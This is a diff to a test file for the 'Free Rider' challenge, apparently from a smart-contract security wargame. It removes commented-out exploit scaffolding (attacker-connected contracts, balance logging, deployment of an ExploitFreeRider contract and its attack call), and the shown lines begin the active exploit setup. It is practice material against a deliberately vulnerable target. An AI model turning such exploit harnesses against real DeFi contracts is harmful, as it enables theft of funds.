@@ -123,46 +123,6 @@ describe("[Challenge] Free Rider", function () {
   });
 
   it("Exploit", async function () {
-    // const targetToken = this.token.connect(attacker);
-    // const targetWeth = this.weth.connect(attacker);
-    // const targetFactory = this.uniswapFactory.connect(attacker);
-    // const targetMarketplace = this.marketplace.connect(attacker);
-    // const targetBuyer = this.buyerContract.connect(attacker);
-    // const targetNft = this.nft.connect(attacker);
-    // const logBalances = async () => {
-    //   const ethAttackerBalance = await ethers.provider.getBalance(
-    //     attacker.address
-    //   );
-    //   const wethAttackerBalance = await targetWeth.balanceOf(attacker.address);
-    //   console.log("Attacker:");
-    //   console.log(
-    //     "         Eth balance:",
-    //     ethers.utils.formatEther(ethAttackerBalance)
-    //   );
-    //   console.log(
-    //     "         Weth balance:",
-    //     ethers.utils.formatEther(wethAttackerBalance)
-    //   );
-    // };
-    // await logBalances();
-    // const exploitFreeRider = await (
-    //   await ethers.getContractFactory("ExploitFreeRider", deployer)
-    // ).deploy(
-    //   targetWeth.address,
-    //   targetToken.address,
-    //   targetFactory.address,
-    //   targetMarketplace.address,
-    //   targetBuyer.address,
-    //   targetNft.address
-    // );
-    // console.log("exploitFreeRider address", exploitFreeRider.address);
-    // console.log("nft owner", await targetNft.ownerOf(0));
-    // console.log("buyer address", await targetBuyer.address);
-    // await exploitFreeRider.attack(targetWeth.address, NFT_PRICE, {
-    //   gasLimit: 1e6,
-    // });
-    // await logBalances();
-
     const exploitFreeRider = (
       await (
         await ethers.getContractFactory("ExploitFreeRider", attacker)
